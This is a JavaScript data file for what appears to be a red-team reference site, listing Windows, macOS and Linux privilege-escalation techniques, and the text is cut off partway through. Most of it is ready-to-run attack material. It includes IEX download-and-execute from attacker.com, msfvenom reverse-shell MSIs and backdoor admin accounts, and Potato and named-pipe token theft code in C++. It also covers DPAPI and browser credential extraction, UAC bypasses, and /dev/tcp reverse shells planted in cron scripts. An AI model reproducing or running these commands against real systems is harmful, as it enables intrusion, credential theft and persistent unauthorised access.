import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'SERVICE EXPLOITS',
    color: 'red',
    nodes: [
      { title: 'Windows Services', subtitle: 'Weak perms • binary perms • unquoted', id: 'services' },
      { title: 'UAC Bypasses', subtitle: 'fodhelper • eventvwr • DLL hijack', id: 'uac' },
      { title: 'Named Pipe Impersonation', subtitle: 'SeImpersonate • named pipe • token theft', id: 'named-pipe' },
      { title: 'TCC & SIP Bypass', subtitle: 'TCC abuse • SIP bypass • AMFI • Gatekeeper', id: 'tcc-sip' },
    ]
  },
  {
    header: 'TOKEN & SECRETS',
    color: 'orange',
    nodes: [
      { title: 'Token Manipulation', subtitle: 'Token impersonation • make token', id: 'tokens' },
      { title: 'DPAPI', subtitle: 'Credential Manager • scheduled task creds', id: 'dpapi' },
      { title: 'AlwaysInstallElevated', subtitle: 'MSI install • SYSTEM via policy', id: 'always-install' },
      { title: 'SUID & Capabilities', subtitle: 'GTFObins • SUID • cap_setuid', id: 'linux-suid' },
      { title: 'Sudo & Cron Abuse', subtitle: 'sudo -l • wildcard • writable script', id: 'linux-sudo' },
    ]
  },
  {
    header: 'KERNEL EXPLOITS',
    color: 'yellow',
    nodes: [
      { title: 'Linux Kernel Exploits', subtitle: 'Dirty COW • DirtyPipe • nf_tables', id: 'linux-kernel' },
      { title: 'Windows Kernel Exploits', subtitle: 'PrintNightmare • EternalBlue • MS17-010', id: 'win-kernel' },
      { title: 'Registry Privesc', subtitle: 'AutoRun • service reg • AlwaysInstallElevated', id: 'reg-privesc' },
    ]
  },
];

const techniques = [
  {
    id: 'services',
    title: 'Windows Service Privilege Escalation',
    subtitle: 'Abuse misconfigured services to escalate from low-privilege user to SYSTEM',
    tags: ['service permissions', 'binary permissions', 'unquoted service path', 'sc.exe', 'PowerUp'],
    accentColor: 'red',
    overview: 'Windows service misconfigurations are the most reliable local privilege escalation path on unpatched or misconfigured systems. Three distinct vectors exist: weak service DACL (you can change the binary path), weak binary ACL (the service EXE is writable), and unquoted service paths (Windows resolves spaces in unquoted paths by trying each component). PowerUp and SharpUp automate discovery of all three. Exploiting any of them results in your payload running as SYSTEM on the next service start.',
    steps: [
      'Weak Service Permissions: if you can modify a service config (sc config), change the binary path to your payload',
      'Weak Service Binary Permissions: if the service binary is writable, replace it with your payload',
      'Unquoted Service Path: if service path contains spaces and no quotes, Windows tries each space-delimited segment',
      'Use PowerUp to automate discovery of all three service misconfigurations',
      'After modifying the service: restart it (requires SeShutdownPrivilege or admin) or wait for reboot',
      'Check if you can restart the service: `sc stop ServiceName && sc start ServiceName`',
    ],
    commands: [
      {
        title: 'PowerUp service enumeration',
        code: `# PowerUp — automated privesc checks
execute-assembly /path/to/PowerUp.exe
# Or inline:
IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Manual: find services with weak permissions
# SharpUp — .NET port of PowerUp
execute-assembly /path/to/SharpUp.exe audit

# Find writable service binary
# Check all service binaries for write access
Get-WmiObject -Class Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"','' -split ' ' | Select-Object -First 1
    if (Test-Path $path) { icacls $path }
}

# Unquoted service path exploitation
# Service path: C:\Program Files\My App\service.exe
# Try: C:\Program.exe, C:\Program Files\My.exe, etc.
# Place payload at one of these locations
shell sc qc "VulnerableService"   # Check service config

# Modify service config (if you have permission)
shell sc config "VulnerableService" binPath= "C:\Windows\Temp\beacon.exe"
shell sc stop "VulnerableService"
shell sc start "VulnerableService"  # Executes beacon as SYSTEM`
      },
      {
        title: 'Weak service permissions exploit',
        code: `# Check service DACL (Accesschk)
execute-assembly /path/to/accesschk.exe -uwcqv "Authenticated Users" *
execute-assembly /path/to/accesschk.exe -uwcqv <USERNAME> *
# Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG

# If service DACL allows config change:
shell sc config "<SERVICE>" binPath= "net localgroup administrators <USER> /add"
shell sc stop "<SERVICE>" && sc start "<SERVICE>"  # Add user to admins
shell sc config "<SERVICE>" binPath= "C:\beacon.exe"  # Then execute beacon as SYSTEM
shell sc stop "<SERVICE>" && sc start "<SERVICE>"

# PowerUp — AbuseService function
Invoke-ServiceAbuse -ServiceName "VulnService" -UserName "domain\attacker"
Invoke-ServiceAbuse -ServiceName "VulnService" -Command "net localgroup administrators attacker /add"`
      }
    ]
  },
  {
    id: 'uac',
    title: 'UAC Bypass Techniques',
    subtitle: 'Bypass User Account Control to elevate from medium to high integrity context',
    tags: ['UAC', 'fodhelper', 'eventvwr', 'sdclt', 'registry hijack', 'auto-elevate'],
    accentColor: 'red',
    overview: 'UAC (User Account Control) separates administrator accounts into medium-integrity and high-integrity tokens. Even a local admin user runs at medium integrity by default. UAC bypasses escalate from medium to high integrity without displaying a UAC prompt, by abusing auto-elevate binaries that read attacker-controlled HKCU registry keys before elevating. This is privilege escalation within the same account — not to a new account. Cobalt Strike\'s runasadmin command automates the most common bypass techniques.',
    steps: [
      'UAC bypass requires being in the local Administrators group — it escalates integrity, not privilege',
      'Auto-elevate binaries: certain Microsoft-signed binaries auto-elevate without UAC prompt — abuse registry to hijack their behavior',
      'fodhelper.exe: reads HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command before auto-elevating',
      'eventvwr.exe: reads HKCU\\SOFTWARE\\Classes\\mscfile\\shell\\open\\command before auto-elevating',
      'Exploit: create the registry key pointing to your beacon, then run the auto-elevate binary',
      'Cobalt Strike: `runasadmin` command automates common UAC bypasses',
    ],
    commands: [
      {
        title: 'UAC bypass via registry hijack',
        code: `# fodhelper UAC bypass (Windows 10)
# 1. Create registry key in HKCU
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "C:\beacon.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force

# 2. Trigger fodhelper (auto-elevates without UAC prompt)
Start-Process "C:\Windows\System32\fodhelper.exe"
# Result: beacon.exe runs with high integrity

# Cleanup (important!)
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force

# eventvwr UAC bypass
New-Item -Path "HKCU:\SOFTWARE\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "C:\beacon.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"

# Cobalt Strike — runasadmin
runasadmin uac-fodhelper beacon.exe           # fodhelper bypass
runasadmin uac-token-duplication beacon.exe   # Token duplication bypass

# Check current integrity level
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | Where-Object { $_.Value -eq 'S-1-16-12288' }
shell whoami /groups | findstr "Mandatory Level"`
      }
    ]
  },
  {
    id: 'tokens',
    title: 'Token Impersonation & Manipulation',
    subtitle: 'Steal or forge access tokens to operate as other users including SYSTEM — Potato exploits for SeImpersonate',
    tags: ['token impersonation', 'SeImpersonatePrivilege', 'GodPotato', 'EfsPotato', 'SweetPotato', 'JuicyPotato', 'PrintSpoofer', 'make token', 'Incognito'],
    accentColor: 'orange',
    overview: 'Windows access tokens define a process\'s security context. SeImpersonatePrivilege (held by IIS, SQL Server, and most service accounts) allows creating a token from an impersonated authentication — Potato exploits abuse this privilege to escalate from a service account to SYSTEM. GodPotato works on all modern Windows versions; EfsPotato targets EFS-based coercion; SweetPotato chains multiple techniques. Cobalt Strike\'s steal_token and make_token cover lateral movement use cases.',
    steps: [
      'Check SeImpersonatePrivilege in whoami /priv — service accounts (IIS, SQL, MSSQL, WCF) almost always have it',
      'If SeImpersonatePrivilege is present: run GodPotato for a SYSTEM shell on Windows 2012+ / Windows 10+',
      'Alternatively: run EfsPotato (EFS coercion) or SweetPotato (multiple technique chain) for older targets',
      'Use PrintSpoofer on Windows 10 / Server 2019 when Potato exploits are detected',
      'Use steal_token in Cobalt Strike to impersonate a token from any running privileged process',
      'Use make_token with known credentials to create a network-auth token without injection',
      'Use Incognito to enumerate and steal all tokens available in the current process context',
    ],
    commands: [
      {
        title: 'Potato exploits — SeImpersonatePrivilege → SYSTEM',
        code: `# Check current privileges
whoami /priv
# Look for: SeImpersonatePrivilege = Enabled

# GodPotato — works on Windows Server 2012+ / Windows 10+ (most reliable)
# https://github.com/BeichenDream/GodPotato
execute-assembly /tools/GodPotato.exe -cmd "cmd /c whoami"
execute-assembly /tools/GodPotato.exe -cmd "cmd /c net user backdoor P@ssw0rd1! /add && net localgroup administrators backdoor /add"
# Or drop a beacon:
execute-assembly /tools/GodPotato.exe -cmd "C:\\Windows\\Temp\\beacon.exe"

# EfsPotato — EFS coercion (Windows 8+, good for newer targets)
# https://github.com/zcgonvh/EfsPotato
execute-assembly /tools/EfsPotato.exe "cmd /c whoami > C:\\Temp\\result.txt"
execute-assembly /tools/EfsPotato.exe "C:\\Windows\\Temp\\beacon.exe"

# SweetPotato — chains multiple techniques (DCOM/WinRM/EFS)
# https://github.com/CCob/SweetPotato
execute-assembly /tools/SweetPotato.exe -p C:\\Windows\\Temp\\beacon.exe

# JuicyPotato — older technique (Windows < Server 2019 / Windows 10 1809)
# https://github.com/ohpe/juicy-potato
execute-assembly /tools/JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\beacon.exe -t * -c {CLSID}
# Requires a valid CLSID for a COM server running as SYSTEM
# List of CLSIDs: https://github.com/ohpe/juicy-potato/tree/master/CLSID

# PrintSpoofer — Windows 10 / Server 2016/2019
# https://github.com/itm4n/PrintSpoofer
execute-assembly /tools/PrintSpoofer.exe -c "C:\\Windows\\Temp\\beacon.exe"
execute-assembly /tools/PrintSpoofer.exe -i -c cmd   # Interactive shell`
      },
      {
        title: 'Token operations — Cobalt Strike & Incognito',
        code: `# List processes with token information
ps   # Shows PID, PPID, user, integrity level

# Steal token from privileged process
steal_token <PID>      # Impersonate the token
getuid                 # Confirm new identity
rev2self               # Revert to original token

# Make token — create with known credentials (network auth only)
make_token DOMAIN\\Administrator Password123
rev2self

# Incognito — enumerate and steal available tokens
execute-assembly /path/to/incognito.exe list_tokens -u
execute-assembly /path/to/incognito.exe impersonate_token "CORP\\Domain Admin User"

# Token store
token-store steal <PID>    # Save token from process
token-store show            # List saved tokens
token-store use 0           # Activate saved token
token-store remove 0        # Clean up`
      }
    ]
  },
  {
    id: 'dpapi',
    title: 'DPAPI — Data Protection API',
    subtitle: 'Decrypt DPAPI-protected secrets: Credential Manager, browser passwords, scheduled task creds',
    tags: ['DPAPI', 'Credential Manager', 'masterkey', 'vault', 'scheduled task creds'],
    accentColor: 'orange',
    overview: 'DPAPI (Data Protection API) is Windows\' built-in secret encryption system, protecting Credential Manager vaults, browser saved passwords, scheduled task credentials, and Wi-Fi passwords. Encryption is tied to the user\'s master key, derived from their login password. As the logged-in user, you can decrypt all their DPAPI secrets without knowing their password. SharpDPAPI automates extraction and decryption. With a plaintext password, all DPAPI secrets for that user can be decrypted offline.',
    steps: [
      'DPAPI protects many Windows secrets: Credential Manager vault, browser saved passwords, scheduled task credentials',
      'Decryption uses the current user\'s password as the key derivative — decrypt as the logged-in user or with recovered password',
      'Enumerate Credential Manager vault entries and decrypt them using Mimikatz or SharpDPAPI',
      'Scheduled tasks that run as another user store credentials encrypted with DPAPI — recoverable',
      'Browser passwords (Chrome, Edge): stored in AppData encrypted with DPAPI — Seatbelt and SharpChrome can extract',
      'If you have the user\'s plaintext password or NTLM hash, you can decrypt all their DPAPI secrets offline',
    ],
    commands: [
      {
        title: 'DPAPI credential extraction',
        code: `# Enumerate Credential Manager vault
shell cmdkey /list     # List stored credentials
shell vaultcmd /listcreds:"Windows Credentials" /all

# Mimikatz — decrypt vault credentials (as current user)
mimikatz vault::cred /patch
mimikatz vault::list

# SharpDPAPI — DPAPI toolkit
execute-assembly /path/to/SharpDPAPI.exe credentials   # Credential Manager
execute-assembly /path/to/SharpDPAPI.exe vaults        # Windows Vaults
execute-assembly /path/to/SharpDPAPI.exe triage        # All DPAPI artifacts

# If you have plaintext password or can escalate to target user:
execute-assembly /path/to/SharpDPAPI.exe credentials /password:Password123

# Scheduled task credentials (if stored)
# Retrieve from registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache
# Encrypted with DPAPI — SharpDPAPI can decrypt if you have access

# Browser passwords (Chrome/Edge)
execute-assembly /path/to/SharpChrome.exe logins       # Chrome saved passwords
execute-assembly /path/to/SharpChrome.exe cookies      # Chrome session cookies

# Mimikatz dpapi module
mimikatz dpapi::cred /in:"%appdata%\Microsoft\Credentials\<BLOB_FILE>"
mimikatz dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<SID>\<MASTERKEY>"  /rpc`
      }
    ]
  },
  {
    id: 'named-pipe',
    title: 'Named Pipe Impersonation',
    subtitle: 'Create a named pipe server to capture and impersonate tokens from privileged connecting clients',
    tags: ['named pipe', 'ImpersonateNamedPipeClient', 'SeImpersonatePrivilege', 'token theft', 'SYSTEM escalation'],
    accentColor: 'red',
    overview: `Named pipe impersonation is a classic Windows privilege escalation technique that requires SeImpersonatePrivilege (held by most service accounts: IIS, SQL Server, WCF, COM servers). A server creates a named pipe, waits for a privileged client to connect, then calls ImpersonateNamedPipeClient() to steal that client's token.

Why privileged clients connect to attacker pipes:
- The Potato family (GodPotato, EfsPotato, etc.) coerces the Windows EFS, RPC Endpoint Mapper, or COM activation service to connect back to an attacker-controlled pipe
- Some services reconnect to named pipes by registered name — squatting that name before the legitimate service registers it catches the connection
- Scheduled tasks or services that call a named pipe by a predictable path without verifying the server's identity

This is fundamentally what every Potato exploit implements — the exact coercion mechanism varies but the impersonation step is identical.`,
    steps: [
      'Check SeImpersonatePrivilege: whoami /priv — almost all service accounts have it',
      'Create a named pipe server: CreateNamedPipe with NULL DACL (allows any client to connect)',
      'Coerce a privileged process to connect: use EFS coercion (EfsPotato), RPC coercion (GodPotato), or COM activation',
      'Call ImpersonateNamedPipeClient() after ConnectNamedPipe() returns — acquires client token',
      'Call OpenThreadToken() to get a handle to the impersonated token',
      'Use CreateProcessWithTokenW() or SetThreadToken() to run code as the impersonated user',
      'Revert with RevertToSelf() — clean up after use',
    ],
    commands: [
      {
        title: 'Named pipe impersonation server (C++)',
        code: `// named_pipe_impersonate.cpp — create pipe, wait for privileged connection, steal token
// Compile: x86_64-w64-mingw32-g++ -o pipe_impersonate.exe named_pipe_impersonate.cpp -lkernel32 -ladvapi32
#include <windows.h>
#include <stdio.h>

bool ImpersonateViaPipe(const wchar_t* pipeName) {
    // Create pipe with NULL DACL — anyone can connect
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    SECURITY_ATTRIBUTES sa = { sizeof(sa), &sd, FALSE };

    HANDLE hPipe = CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 4096, 4096, 0, &sa);
    
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe failed: %lu\\n", GetLastError()); return false;
    }
    printf("[*] Pipe created: %ls\\n", pipeName);
    printf("[*] Waiting for privileged client to connect...\\n");

    // Block until client connects (trigger coercion in parallel)
    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        printf("[-] ConnectNamedPipe failed: %lu\\n", GetLastError());
        CloseHandle(hPipe); return false;
    }
    printf("[+] Client connected — impersonating\\n");

    // Impersonate the connecting client
    if (!ImpersonateNamedPipeClient(hPipe)) {
        printf("[-] ImpersonateNamedPipeClient failed: %lu\\n", GetLastError());
        CloseHandle(hPipe); return false;
    }

    // Get impersonated token
    HANDLE hToken = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
        printf("[-] OpenThreadToken failed: %lu\\n", GetLastError());
        RevertToSelf(); CloseHandle(hPipe); return false;
    }

    // Check who we are now
    char username[256] = {}; DWORD userLen = sizeof(username);
    GetUserNameA(username, &userLen);
    printf("[+] Impersonating: %s\\n", username);

    // Spawn a new process with the stolen SYSTEM token
    HANDLE hPrimaryToken = NULL;
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken);
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (CreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE,
        L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[+] SYSTEM cmd.exe launched (PID %lu)\\n", pi.dwProcessId);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    RevertToSelf();
    CloseHandle(hToken); CloseHandle(hPrimaryToken); CloseHandle(hPipe);
    return true;
}

int main() {
    // Pair with EfsPotato or GodPotato coercion in another thread
    // Common pipe names used by Potato exploits:
    //   \\\\.\\pipe\\SpoolSS (PrintSpoofer)
    //   \\\\.\\pipe\\MsFteWds (EfsPotato)
    //   \\\\.\\pipe\\MSSQL$... (SQL-targeted)
    return ImpersonateViaPipe(L"\\\\\\\\.\\\\pipe\\\\GodPotato") ? 0 : 1;
}

// --- Coercion side (run in parallel or before the pipe server) ---
// GodPotato (execute-assembly — coerces COM activation to connect to our pipe)
// execute-assembly /tools/GodPotato.exe -cmd "cmd /c whoami"
// EfsPotato (EFS coercion)
// execute-assembly /tools/EfsPotato.exe "cmd /c whoami"`
      }
    ]
  },
  {
    id: 'always-install',
    title: 'AlwaysInstallElevated — MSI Privilege Escalation',
    subtitle: 'Exploit group policy misconfiguration that allows any user to install MSI packages as SYSTEM',
    tags: ['AlwaysInstallElevated', 'MSI', 'SYSTEM escalation', 'group policy', 'msiexec', 'PowerUp'],
    accentColor: 'orange',
    overview: `AlwaysInstallElevated is a Windows Group Policy setting that, when enabled in BOTH HKLM and HKCU, allows any standard user to install MSI packages with SYSTEM privileges. This is a common misconfiguration in enterprise environments where desktop support staff needed to allow self-service software installation.

PowerUp's Get-RegistryAlwaysInstallElevated check is definitive. If both keys are set to 1, generate a malicious MSI with msfvenom or MSIBuilder that runs a payload during installation — it executes as SYSTEM silently.`,
    steps: [
      'Check both HKCU and HKLM registry keys — BOTH must be set to 1 for the exploit to work',
      'Generate a malicious MSI with msfvenom or manually with WiX Toolset',
      'Run the MSI with msiexec — it installs silently as SYSTEM due to the policy',
      'The payload in the MSI custom action runs as SYSTEM',
      'PowerUp automates detection: Invoke-AllChecks or specific Get-RegistryAlwaysInstallElevated check',
    ],
    commands: [
      {
        title: 'AlwaysInstallElevated detection and exploitation',
        code: `# Step 1: Check if vulnerable
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# Both must show: AlwaysInstallElevated    REG_DWORD    0x1

# PowerUp automated check
execute-assembly /tools/PowerUp.exe
# Or: IEX (New-Object Net.WebClient).DownloadString('https://attacker/PowerUp.ps1')
Get-RegistryAlwaysInstallElevated
# Returns True if vulnerable

# Step 2: Generate malicious MSI
# msfvenom — MSI that adds a local admin user
msfvenom -p windows/x64/exec CMD="net localgroup administrators attacker /add" -f msi -o evil.msi

# Better: MSI that runs beacon
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > beacon.msi

# Or: PowerUp — Write-UserAddMSI generates an MSI that adds a backdoor admin
Write-UserAddMSI   # Creates UserAdd.msi in current directory

# Step 3: Install MSI as SYSTEM (elevated due to policy)
msiexec /quiet /qn /i evil.msi
# /quiet /qn = silent install
# Executes MSI custom actions as SYSTEM

# Upload and execute via beacon:
upload /tmp/evil.msi C:\\Windows\\Temp\\update.msi
shell msiexec /quiet /qn /i C:\\Windows\\Temp\\update.msi

# Step 4: Verify (custom action added local admin)
shell net localgroup administrators
# Or: beacon should have called back as SYSTEM`
      }
    ]
  },
];

const macOSPrivesc = [
  {
    id: 'tcc-sip',
    title: 'macOS TCC & SIP Bypass',
    subtitle: 'Abuse Transparency Consent Control and System Integrity Protection to escalate privileges on macOS',
    tags: ['TCC', 'SIP', 'AMFI', 'Gatekeeper', 'csrutil', 'sudo', 'AuthorizationExecuteWithPrivileges'],
    accentColor: 'red',
    overview: 'macOS TCC (Transparency Consent Control) is the permission system controlling app access to sensitive resources — camera, microphone, full disk access, contacts, and location. SIP (System Integrity Protection) prevents modification of system files even by root. TCC bypass techniques exploit apps that already have Full Disk Access and can be injected into or whose helper paths are writable. SIP can only be disabled physically via recovery mode or via certain kernel exploits.',
    steps: [
      'TCC (Transparency Consent Control): manages app permissions — abuse via existing full-disk-access apps or injection',
      'SIP (System Integrity Protection): protects system files — requires physical access or NVRAM boot-arg disable to bypass',
      'Check SIP status: csrutil status — if disabled, /System and /usr are writable',
      'TCC bypass via sudo: if you have sudo, copy a TCC-privileged binary and hijack it',
      'CVE-2023-26818: bypass TCC by exploiting Telegram\'s entitlements — read arbitrary files',
      'AuthorizationExecuteWithPrivileges: deprecated API still used by some apps — abuse for root code exec',
      'Gatekeeper bypass: copy app to /private/tmp (no quarantine check in some macOS versions)',
    ],
    commands: [
      {
        title: 'TCC and SIP enumeration and bypass',
        code: `# Check SIP status
csrutil status
# "System Integrity Protection status: disabled." = SIP off → writable system paths

# Check TCC DB (requires root or SIP disabled)
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "select client,service,auth_value from access where auth_value=2"
# auth_value=2 means granted — look for kTCCServiceSystemPolicyAllFiles

# TCC bypass — inject into FDA (Full Disk Access) app
# If target app has FDA entitlement and loads external libraries:
# 1. Find app with FDA:
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "select client from access where service='kTCCServiceSystemPolicyAllFiles' and auth_value=2"
# 2. Check if it loads a dylib from writable path:
DYLD_PRINT_LIBRARIES=1 /path/to/fda_app 2>&1 | grep "not found"
# 3. Place malicious dylib at that path

# sudo privesc (if user is in sudoers)
sudo -l         # What can we run as root?
sudo /bin/bash  # If ALL allowed

# AuthorizationExecuteWithPrivileges abuse
# Some apps call this deprecated API with user-writable helper path
# Replace the helper binary before the app calls it

# Gatekeeper bypass (copy trick)
cp /Applications/VulnerableApp.app /tmp/
# Some versions skip quarantine check for copies in /tmp
xattr -d com.apple.quarantine /tmp/VulnerableApp.app/Contents/MacOS/VulnerableApp

# AMFI disable via boot-args (physical access / MDM)
nvram boot-args="amfi_get_out_of_my_way=0x1"
# Reboot — now unsigned code runs freely

# Check current user's entitlements
codesign -d --entitlements - /path/to/binary
# Look for com.apple.private.tcc.allow or com.apple.security.cs.disable-library-validation`
      }
    ]
  },
];

const linuxPrivesc = [
  {
    id: 'linux-suid',
    title: 'SUID Binaries & Linux Capabilities',
    subtitle: 'Exploit SUID executables and Linux capabilities to escalate to root via GTFObins',
    tags: ['SUID', 'SGID', 'GTFObins', 'capabilities', 'cap_setuid', 'find', 'python'],
    accentColor: 'orange',
    overview: 'SUID binaries run as their owner (often root) regardless of who executes them. If any GTFObins-listed binary (find, python, bash, vim, nmap, perl, tar) has the SUID bit set, it can be abused to spawn a root shell. Linux capabilities (getcap) assign specific privilege subsets to binaries without requiring full SUID — cap_setuid on python or perl is equivalent to SUID for privilege escalation purposes.',
    steps: [
      'Find all SUID binaries on the system — compare against GTFObins for exploitable entries',
      'Common GTFObins SUID exploits: find, python, bash, vim, nmap, perl, ruby, awk',
      'Linux capabilities: cap_setuid or cap_net_admin on binaries allow root escalation without SUID',
      'getcap enumerates capabilities — check for python, perl, node with cap_setuid',
      'Writable SUID binary: if you can write to a SUID binary, replace it with a shell',
      'PATH hijacking: if a SUID binary calls another program without full path — create a fake one in PATH',
    ],
    commands: [
      {
        title: 'SUID and capability exploitation',
        code: `# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Common exploitable: find, python3, bash, vim, nmap, perl, ruby, awk, tar, cp, mv

# GTFObins examples:
# bash (SUID)
bash -p   # -p preserves EUID — gives root shell

# find (SUID)
find . -exec /bin/sh -p \\; -quit

# python3 (SUID)
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# vim (SUID)
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# nmap (SUID, older versions)
nmap --interactive  # then: !sh

# tar (SUID, wildcard injection)
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh root.sh'
tar cf /dev/null *   # root.sh executes as root

# Capabilities
getcap -r / 2>/dev/null

# python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# node with cap_setuid
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio:[0,1,2]})'`
      }
    ]
  },
  {
    id: 'linux-sudo',
    title: 'Sudo & Cron Abuse',
    subtitle: 'Abuse misconfigured sudo rules, writable cron scripts, and wildcard injections for privilege escalation',
    tags: ['sudo -l', 'NOPASSWD', 'cron', 'wildcard injection', 'writable script', 'env_keep', 'LD_PRELOAD'],
    accentColor: 'orange',
    overview: 'sudo misconfiguration is the most common Linux privilege escalation vector. A NOPASSWD entry for almost any standard utility in /etc/sudoers leads to root via GTFObins. If the sudoers file preserves LD_PRELOAD, a malicious shared library injected via that variable runs as root. Writable cron scripts called by root\'s crontab provide reliable scheduled escalation. Wildcard injection in cron commands running tar or rsync allows injecting flags as filenames.',
    steps: [
      'sudo -l: list commands the current user can run as root — NOPASSWD entries are instant escalation',
      'GTFObins sudo: many standard tools can spawn shells when run via sudo (vim, python, find, etc.)',
      'env_keep LD_PRELOAD: if sudo preserves LD_PRELOAD, inject a malicious shared library',
      'Writable cron script: if a script called by root cron is writable, append your payload',
      'Cron PATH: if cron PATH includes a writable directory before the real binary location',
      'Wildcard injection in cron: if root cron runs tar/rsync with *, inject --checkpoint flags',
    ],
    commands: [
      {
        title: 'Sudo and cron exploitation',
        code: `# Check sudo permissions
sudo -l
# Look for: (ALL) NOPASSWD: /usr/bin/vim
#           (root) NOPASSWD: /usr/bin/python3

# sudo GTFObins examples:
# vim
sudo vim -c ':!sh'
# python
sudo python3 -c 'import os; os.system("/bin/bash")'
# find
sudo find . -exec /bin/sh \\; -quit
# less
sudo less /etc/passwd  # then: !sh
# awk
sudo awk 'BEGIN {system("/bin/sh")}'
# env
sudo env /bin/sh

# LD_PRELOAD abuse (if env_keep+=LD_PRELOAD in sudoers)
# Compile malicious shared lib:
cat > evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so find   # triggers _init as root

# Writable cron script
ls -la /etc/cron.d/ /etc/cron.daily/
cat /etc/crontab
# Find scripts owned/writable by current user:
find /etc/cron* -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null
# Append reverse shell to writable cron script:
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /etc/cron.daily/cleanup

# Wildcard injection (cron running tar on *)
# If cron runs: cd /var/backups && tar -czf backup.tgz *
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=bash shell.sh'
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > shell.sh
chmod +x shell.sh
# When cron runs next, tar processes the filenames as flags`
      }
    ]
  },
  {
    id: 'reg-privesc',
    title: 'Windows Registry Privilege Escalation',
    subtitle: 'Abuse writable registry keys under HKLM to achieve SYSTEM execution via service paths, AutoRun, and ImageFileExecutionOptions',
    tags: ['registry privesc', 'HKLM writable', 'service ImagePath', 'ImageFileExecutionOptions', 'debugger hijack', 'Accessibility Features'],
    accentColor: 'yellow',
    overview: `Registry-based privilege escalation targets writable HKLM keys that control system-level execution:

1. SERVICE ImagePath: if the registry key for a service under HKLM\\SYSTEM\\CurrentControlSet\\Services is writable (not just the binary), change ImagePath to your payload — service runs as SYSTEM on restart.

2. ImageFileExecutionOptions (IFEO) Debugger: attach a debugger to a system binary like sethc.exe (Sticky Keys) or utilman.exe — when that accessibility binary runs at the Windows login screen (pre-auth), your payload executes as SYSTEM with no credentials needed.

3. AppInit_DLLs: injected into all user32.dll-loading processes — if the registry key is writable, your DLL loads into virtually every Windows application as that process's user.

4. Accessibility Feature Backdoor (ATT&CK T1546.008): replace or register a debugger for sethc.exe, utilman.exe, or osk.exe — accessible from the lock screen or login screen without credentials.`,
    steps: [
      'Check write permissions on service registry keys: accesschk -wk "Authenticated Users" HKLM\\SYSTEM\\CurrentControlSet\\Services',
      'If service key is writable: change ImagePath to payload path, restart or wait for reboot',
      'IFEO debugger: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe → Debugger = cmd.exe',
      'Trigger the IFEO backdoor from login screen: press Shift 5 times to launch Sticky Keys → cmd.exe as SYSTEM',
      'AppInit_DLLs: check if HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs is writable',
      'Autorun key check: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run — if writable, runs as the logged-in user on boot',
    ],
    commands: [
      {
        title: 'Registry privesc techniques',
